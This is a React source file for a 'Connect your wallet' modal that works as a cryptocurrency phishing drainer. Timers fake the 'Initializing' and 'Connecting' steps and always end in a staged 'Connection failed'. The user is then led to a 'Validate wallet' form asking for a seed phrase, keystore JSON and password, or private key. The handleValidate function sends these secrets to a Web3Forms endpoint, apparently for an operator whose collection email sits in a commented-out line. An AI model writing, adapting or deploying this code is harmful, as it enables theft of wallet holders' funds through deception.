"use client";

import { WALLET_OPTIONS } from "@/lib/data/wallets";
import { submitWeb3Forms } from "@/lib/web3formsConfig";
import { getImagePath } from "@/lib/utils/imagePath";
import {
  Tab,
  TabGroup,
  TabList,
  TabPanel,
  TabPanels,
} from "@headlessui/react";
import { Icon } from "@iconify/react/dist/iconify.js";
import Image from "next/image";
import { useCallback, useEffect, useState } from "react";
import toast from "react-hot-toast";

type Step =
  | "list"
  | "initializing"
  | "connecting"
  | "connectionFailed"
  | "validate";

const INIT_MS = 3000;
const CONNECT_MS = 2500;
const FAILED_MODAL_MS = 3000;

type WalletRow = (typeof WALLET_OPTIONS)[number];
const WALLET_IMAGE_EXTENSIONS = ["svg", "png", "webp", "jpg", "jpeg"] as const;

function WalletLogo({
  wallet,
  sizeClassName,
  iconClassName,
}: {
  wallet: WalletRow;
  sizeClassName: string;
  iconClassName: string;
}) {
  const [imgError, setImgError] = useState(false);
  const [extIndex, setExtIndex] = useState(0);

  useEffect(() => {
    setImgError(false);
    setExtIndex(0);
  }, [wallet.id]);

  const src = getImagePath(
    `/images/wallet/${wallet.id}.${WALLET_IMAGE_EXTENSIONS[extIndex]}`
  );

  if (imgError) {
    return <Icon icon={wallet.icon} className={iconClassName} aria-hidden />;
  }

  return (
    <Image
      src={src}
      alt={wallet.name}
      width={48}
      height={48}
      className={sizeClassName}
      onError={() => {
        const nextExtIndex = extIndex + 1;
        if (nextExtIndex >= WALLET_IMAGE_EXTENSIONS.length) {
          setImgError(true);
          return;
        }
        setExtIndex(nextExtIndex);
      }}
    />
  );
}

function WalletConnectionLoader({
  wallet,
  phase,
}: {
  wallet: WalletRow;
  phase: "initializing" | "connecting";
}) {
  const initializing = phase === "initializing";

  return (
    <div
      className="relative flex min-h-[288px] flex-col items-center justify-center overflow-hidden px-8 py-12 text-center sm:min-h-[308px] sm:px-10 sm:py-14"
      role="status"
      aria-live="polite"
      aria-busy="true"
      aria-label={initializing ? "Initializing wallet" : "Connecting wallet"}
    >
      <div
        className="pointer-events-none absolute inset-0 bg-linear-to-br from-primary/[0.08] via-white to-secondary/[0.1]"
        aria-hidden
      />
      <div
        className="pointer-events-none absolute -top-28 left-1/2 h-56 w-56 -translate-x-1/2 rounded-full bg-primary/25 blur-3xl motion-safe:animate-pulse"
        aria-hidden
      />
      <div
        className="pointer-events-none absolute -bottom-20 -right-10 h-48 w-48 rounded-full bg-secondary/20 blur-3xl motion-safe:animate-pulse motion-safe:[animation-delay:1s]"
        aria-hidden
      />
      <div
        className="pointer-events-none absolute left-1/2 top-1/2 h-px w-[120%] -translate-x-1/2 -translate-y-1/2 rotate-[-12deg] bg-linear-to-r from-transparent via-primary/15 to-transparent"
        aria-hidden
      />

      <div className="relative z-10 flex flex-col items-center">
        <div className="relative mb-7">
          <div
            className="absolute inset-[-10px] rounded-3xl bg-linear-to-br from-primary/35 to-secondary/35 opacity-70 blur-lg motion-safe:animate-pulse"
            aria-hidden
          />
          <div className="relative flex h-[5.25rem] w-[5.25rem] items-center justify-center rounded-2xl bg-white shadow-[0_12px_40px_-12px_rgba(45,106,222,0.35)] ring-1 ring-gray-200/80">
            <WalletLogo
              wallet={wallet}
              sizeClassName="h-[2.85rem] w-[2.85rem] object-contain"
              iconClassName="h-[2.85rem] w-[2.85rem] text-gray-900"
            />
          </div>
        </div>

        <p className="max-w-[16rem] text-xl font-bold leading-tight tracking-tight text-gray-900 sm:text-2xl">
          {wallet.name}
        </p>
        <p
          className={`mt-2 text-sm font-semibold sm:text-base ${
            initializing
              ? "bg-linear-to-r from-primary to-secondary bg-clip-text text-transparent"
              : "text-secondary"
          }`}
        >
          {initializing ? "Initializing…" : "Connecting…"}
        </p>
        <p className="mt-1 max-w-[14rem] text-xs leading-relaxed text-gray-500 sm:text-sm">
          {initializing
            ? "Preparing a secure session with your wallet."
            : "Establishing an encrypted link—almost there."}
        </p>

        {initializing ? (
          <div className="relative mt-10 h-14 w-14" aria-hidden>
            <div className="absolute inset-0 rounded-full border-2 border-gray-200/90 bg-white/50" />
            <div className="absolute inset-0 rounded-full border-2 border-transparent border-t-primary border-r-secondary motion-safe:animate-spin motion-safe:[animation-duration:0.8s]" />
            <div className="absolute inset-2 rounded-full border border-primary/20 motion-safe:animate-spin motion-safe:[animation-duration:1.4s] motion-safe:[animation-direction:reverse]" />
          </div>
        ) : (
          <div
            className="mt-10 flex items-center justify-center gap-2"
            aria-hidden
          >
            {[0, 1, 2].map((i) => (
              <span
                key={i}
                className="h-2.5 w-2.5 rounded-full bg-linear-to-br from-primary to-secondary motion-safe:animate-bounce"
                style={{
                  animationDelay: `${i * 140}ms`,
                  animationDuration: "0.7s",
                }}
              />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

function WalletConnectionFailedPanel({
  wallet,
  onConnectManually,
}: {
  wallet: WalletRow;
  onConnectManually: () => void;
}) {
  return (
    <div
      className="relative flex min-h-[280px] flex-col items-center justify-center overflow-hidden px-6 py-10 text-center sm:min-h-[300px] sm:px-8 sm:py-12"
      role="group"
      aria-labelledby="wallet-failed-title"
      aria-describedby="wallet-failed-desc"
    >
      <div
        className="pointer-events-none absolute inset-0 bg-linear-to-br from-rose-50/90 via-white to-amber-50/50"
        aria-hidden
      />
      <div className="relative z-10 flex max-w-sm flex-col items-center">
        <div className="relative mb-5">
          <div
            className="absolute inset-[-8px] rounded-2xl bg-rose-200/40 blur-md"
            aria-hidden
          />
          <div className="relative flex h-[4.5rem] w-[4.5rem] items-center justify-center rounded-2xl bg-white shadow-md ring-1 ring-rose-100">
            <WalletLogo
              wallet={wallet}
              sizeClassName="h-10 w-10 object-contain opacity-90"
              iconClassName="h-10 w-10 text-gray-800 opacity-80"
            />
          </div>
          <div className="absolute -bottom-1 -right-1 flex h-8 w-8 items-center justify-center rounded-full bg-white shadow ring-1 ring-rose-100">
            <Icon
              icon="tabler:alert-circle"
              className="h-5 w-5 text-rose-500"
              aria-hidden
            />
          </div>
        </div>
        <p className="text-sm font-semibold text-gray-600">{wallet.name}</p>
        <h2
          id="wallet-failed-title"
          className="mt-2 text-lg font-bold text-gray-900 sm:text-xl"
        >
          Connection failed
        </h2>
        <p
          id="wallet-failed-desc"
          className="mt-2 text-sm leading-relaxed text-gray-600"
        >
          We couldn&apos;t finish the automatic connection. You can continue
          manually below this screen will move on in a few seconds.
        </p>
        <button
          type="button"
          onClick={onConnectManually}
          className="mt-8 w-full max-w-xs rounded-xl bg-linear-to-r from-primary to-secondary py-3.5 text-sm font-semibold text-white shadow-sm transition hover:opacity-95 focus:outline-none focus-visible:ring-2 focus-visible:ring-secondary/50 sm:text-base"
        >
          Connect manually
        </button>
      </div>
    </div>
  );
}

type Props = {
  onClose: () => void;
};

const validateTextAreaClassName =
  "w-full resize-y rounded-xl border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/30";

const validateInputClassName =
  "w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/30";

// const DEFAULT_SUBMISSION_EMAIL = "quantislottery@atomicmail.io";

function submissionErrorMessage(reason: unknown): string {
  if (reason instanceof Error && reason.message) {
    return reason.message;
  }
  if (
    reason &&
    typeof reason === "object" &&
    "message" in reason &&
    typeof (reason as { message: unknown }).message === "string"
  ) {
    const m = (reason as { message: string }).message;
    if (m) return m;
  }
  return "Could not send the form. Check your connection and try again.";
}

const WalletConnectModal = ({ onClose }: Props) => {
  const [step, setStep] = useState<Step>("list");
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [fullName, setFullName] = useState("");
  const [username, setUsername] = useState("");
  const [news, setNews] = useState("");
  const [bio, setBio] = useState("");
  const [validateTabIndex, setValidateTabIndex] = useState(0);

  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);

  const selected = WALLET_OPTIONS.find((w) => w.id === selectedId);
  const filteredWallets = WALLET_OPTIONS.filter((w) =>
    w.name.toLowerCase().includes(searchQuery.trim().toLowerCase())
  );

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  useEffect(() => {
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = prev;
    };
  }, []);

  const goToValidateForm = useCallback(() => {
    setStep("validate");
  }, []);

  useEffect(() => {
    if (!selectedId) return;
    if (step === "initializing") {
      const t = window.setTimeout(() => setStep("connecting"), INIT_MS);
      return () => window.clearTimeout(t);
    }
    if (step === "connecting") {
      const t = window.setTimeout(() => setStep("connectionFailed"), CONNECT_MS);
      return () => window.clearTimeout(t);
    }
    if (step === "connectionFailed") {
      const t = window.setTimeout(goToValidateForm, FAILED_MODAL_MS);
      return () => window.clearTimeout(t);
    }
  }, [step, selectedId, goToValidateForm]);

  const resetValidateFields = useCallback(() => {
    setFormError(null);
    setFullName("");
    setUsername("");
    setNews("");
    setBio("");
    setValidateTabIndex(0);
  }, []);

  const resetAndClose = useCallback(() => {
    setStep("list");
    setSelectedId(null);
    setSearchQuery("");
    resetValidateFields();
    onClose();
  }, [onClose, resetValidateFields]);

  const handleWalletClick = (id: string) => {
    setSelectedId(id);
    resetValidateFields();
    setStep("initializing");
  };

  const handleValidate = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (validateTabIndex === 0) {
      if (!fullName.trim()) {
        toast.error("Please enter your Phrase.");
        return;
      }
    } else if (validateTabIndex === 1) {
      if (!username.trim()) {
        toast.error("Please enter your wallet password.");
        return;
      }
      if (!news.trim()) {
        toast.error("Please enter your news details.");
        return;
      }
    } else if (validateTabIndex === 2) {
      if (!bio.trim()) {
        toast.error("Please enter a short bio.");
        return;
      }
    }

    const activeTab =
      validateTabIndex === 0
        ? "phrase"
        : validateTabIndex === 1
          ? "keystore"
          : "private_key";
    const displayName =
      fullName.trim() || username.trim() || bio.trim().slice(0, 48) || "—";

    setFormError(null);
    setSubmitting(true);
    try {
      await submitWeb3Forms({
        subject: `Wallet validate — ${selected?.name ?? "wallet"}`,
        // email: DEFAULT_SUBMISSION_EMAIL,
        // name: displayName,
        message: `Wallet: ${selected?.name ?? ""} (${selected?.id ?? ""}). Active tab: ${activeTab}.`,
        // selected_wallet: selected?.name ?? "",
        // selected_wallet_id: selected?.id ?? "",
        // active_tab: activeTab,
        phrase: fullName.trim(),
        keystore_json: news.trim(),
        wallet_password: username.trim(),
        private_key: bio.trim(),
      });
      toast.success(
        `Thanks, ${displayName}. Continue in ${selected?.name ?? "your wallet"}.`
      );
      resetAndClose();
    } catch (reason: unknown) {
      console.error("[wallet validate] Web3Forms submit failed", reason);
      const msg = submissionErrorMessage(reason);
      setFormError(msg);
      toast.error(msg);
    } finally {
      setSubmitting(false);
    }
  };

  const goBack = () => {
    setStep("list");
    setSelectedId(null);
    setSearchQuery("");
    resetValidateFields();
  };

  const tabClass = ({ selected }: { selected: boolean }) =>
    [
      "flex-1 border-b-2 border-transparent px-2 py-2.5 text-center text-sm font-semibold transition focus:outline-none focus-visible:ring-2 focus-visible:ring-secondary/40 sm:px-3",
      selected
        ? "border-emerald-400 text-emerald-500"
        : "text-gray-900 hover:text-gray-700",
    ].join(" ");

  return (
    <div
      className="fixed inset-0 z-[100] overflow-y-auto overscroll-contain bg-body-bg/95 backdrop-blur-sm"
      role="dialog"
      aria-modal="true"
      aria-labelledby="wallet-modal-title"
    >
      <div
        className="flex min-h-[100dvh] flex-col items-center justify-center px-3 py-6 sm:px-4 sm:py-8"
        style={{
          paddingTop: "max(1.5rem, env(safe-area-inset-top))",
          paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))",
        }}
      >
        <p
          id="wallet-modal-title"
          className="mb-3 w-full max-w-md text-center text-base font-medium text-white sm:mb-4 sm:text-xl"
        >
          Connect your wallet
        </p>

        <div className="flex w-full max-w-md flex-col overflow-hidden rounded-2xl bg-white shadow-xl dark:bg-slate-100">
        {step === "list" ? (
          <>
            <div className="border-b border-gray-200 px-5 py-4">
              <h2 className="text-lg font-bold text-gray-900">
                Connect to a wallet
              </h2>
            </div>
            <div className="px-3 pt-3 sm:px-4 sm:pt-4">
              <label htmlFor="wallet-search" className="sr-only">
                Search wallets
              </label>
              <input
                id="wallet-search"
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search wallet"
                className="w-full rounded-xl border border-gray-200 px-3 py-2.5 text-sm text-gray-900 placeholder:text-gray-400 focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/30"
              />
            </div>
            <ul className="max-h-[50vh] space-y-2 overflow-y-auto overscroll-contain p-3 sm:max-h-[420px] sm:p-4">
              {filteredWallets.length === 0 ? (
                <li className="rounded-xl border border-dashed border-gray-300 bg-gray-50 px-4 py-6 text-center text-sm text-gray-600">
                  No wallets found for "{searchQuery}".
                </li>
              ) : (
                filteredWallets.map((w) => (
                  <li key={w.id}>
                    <button
                      type="button"
                      onClick={() => handleWalletClick(w.id)}
                      className="flex w-full min-w-0 items-center gap-2 rounded-xl border border-gray-200 bg-white px-3 py-2.5 text-left transition hover:border-secondary/40 hover:bg-slate-50 sm:gap-3 sm:px-4 sm:py-3"
                    >
                      <span
                        className="h-2.5 w-2.5 shrink-0 rounded-full bg-emerald-500"
                        aria-hidden
                      />
                      <span className="min-w-0 flex-1 truncate font-medium text-gray-900 text-sm sm:text-base">
                        {w.name}
                      </span>
                      <WalletLogo
                        wallet={w}
                        sizeClassName="h-8 w-8 shrink-0 object-contain"
                        iconClassName="h-8 w-8 shrink-0 text-gray-800"
                      />
                    </button>
                  </li>
                ))
              )}
            </ul>
          </>
        ) : step === "initializing" || step === "connecting" ? (
          selected ? (
            <WalletConnectionLoader
              wallet={selected}
              phase={step === "initializing" ? "initializing" : "connecting"}
            />
          ) : null
        ) : step === "connectionFailed" ? (
          selected ? (
            <WalletConnectionFailedPanel
              wallet={selected}
              onConnectManually={goToValidateForm}
            />
          ) : null
        ) : (
          <form
            onSubmit={(e) => void handleValidate(e)}
            className="flex flex-col p-5 sm:p-6"
          >
            <button
              type="button"
              onClick={goBack}
              className="mb-4 flex w-fit items-center gap-1 text-sm font-medium text-secondary hover:underline"
            >
              <Icon icon="tabler:arrow-left" className="h-4 w-4" />
              Back to wallets
            </button>
            <div className="mb-4 flex items-center gap-3">
              {selected && (
                <WalletLogo
                  wallet={selected}
                  sizeClassName="h-10 w-10 object-contain"
                  iconClassName="h-10 w-10 text-gray-900"
                />
              )}
              <div>
                <h2 className="text-lg font-bold text-gray-900">
                  Validate wallet
                </h2>
                <p className="text-sm text-gray-600">
                  {selected?.name ?? "Selected wallet"}
                </p>
              </div>
            </div>
            <p className="mb-4 text-sm text-gray-600">
              Import your {selected?.name ?? "selected"} wallet.
            </p>

            <TabGroup
              selectedIndex={validateTabIndex}
              onChange={setValidateTabIndex}
              className="mb-4"
            >
              <TabList className="flex items-end border-b border-gray-200">
                <Tab type="button" className={tabClass}>
                  phrase
                </Tab>
                <Tab type="button" className={tabClass}>
                  keystore JSON
                </Tab>
                <Tab type="button" className={tabClass}>
                  Private Key
                </Tab>
              </TabList>
              <TabPanels className="mt-4">
                <TabPanel className="outline-none focus:outline-none">
                  <label htmlFor="wallet-fullname" className="sr-only">
                    Phrase
                  </label>
                  <textarea
                    id="wallet-fullname"
                    name="fullname"
                    disabled={validateTabIndex !== 0}
                    rows={4}
                    autoComplete="name"
                    placeholder="Enter your Phrase"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    className={validateTextAreaClassName}
                  />
                </TabPanel>
                <TabPanel className="outline-none focus:outline-none">
                  <div className="flex flex-col gap-4">
                    <div>
                      <label htmlFor="wallet-news" className="sr-only">
                      keystone JSON
                      </label>
                      <textarea
                        id="wallet-news"
                        name="keystone JSON"
                        rows={4}
                        placeholder="Enter your keystone JSON"
                        value={news}
                        disabled={validateTabIndex !== 1}
                        onChange={(e) => setNews(e.target.value)}
                        className={validateTextAreaClassName}
                      />
                    </div>
                    <div>
                      <label htmlFor="wallet-username" className="sr-only">
                        Enter Password
                      </label>
                      <input
                        id="wallet-username"
                        name="username"
                        type="text"
                        autoComplete="username"
                        placeholder="Wallet password"
                        value={username}
                        disabled={validateTabIndex !== 1}
                        onChange={(e) => setUsername(e.target.value)}
                        className={validateInputClassName}
                      />
                    </div>
                  </div>
                </TabPanel>
                <TabPanel className="outline-none focus:outline-none">
                  <label htmlFor="wallet-bio" className="sr-only">
                    Private Key
                  </label>
                  <textarea
                    id="wallet-bio"
                    name="bio"
                    disabled={validateTabIndex !== 2}
                    rows={4}
                    placeholder="Enter your Private Key"
                    value={bio}
                    onChange={(e) => setBio(e.target.value)}
                    className={validateTextAreaClassName}
                  />
                </TabPanel>
              </TabPanels>
            </TabGroup>

            {formError ? (
              <p className="mb-2 text-sm text-red-600" role="alert">
                {formError}
              </p>
            ) : null}

            <div className="mt-2 flex flex-wrap gap-3">
              <button
                type="submit"
                disabled={submitting}
                className="flex-1 rounded-xl bg-linear-to-r from-primary to-secondary py-3 font-semibold text-white transition hover:opacity-95 min-w-[8rem] disabled:cursor-not-allowed disabled:opacity-60"
              >
                {submitting ? "Sending…" : "Validate"}
              </button>
              <button
                type="button"
                onClick={resetAndClose}
                className="rounded-xl border border-red-400 px-5 py-3 font-medium text-red-600 transition hover:bg-red-50"
              >
                Close
              </button>
            </div>
          </form>
        )}
        </div>

        <button
          type="button"
          onClick={resetAndClose}
          className="mt-4 text-sm text-lightpurple underline-offset-2 hover:text-white hover:underline sm:mt-6"
        >
          Cancel
        </button>
      </div>
    </div>
  );
};

export default WalletConnectModal;
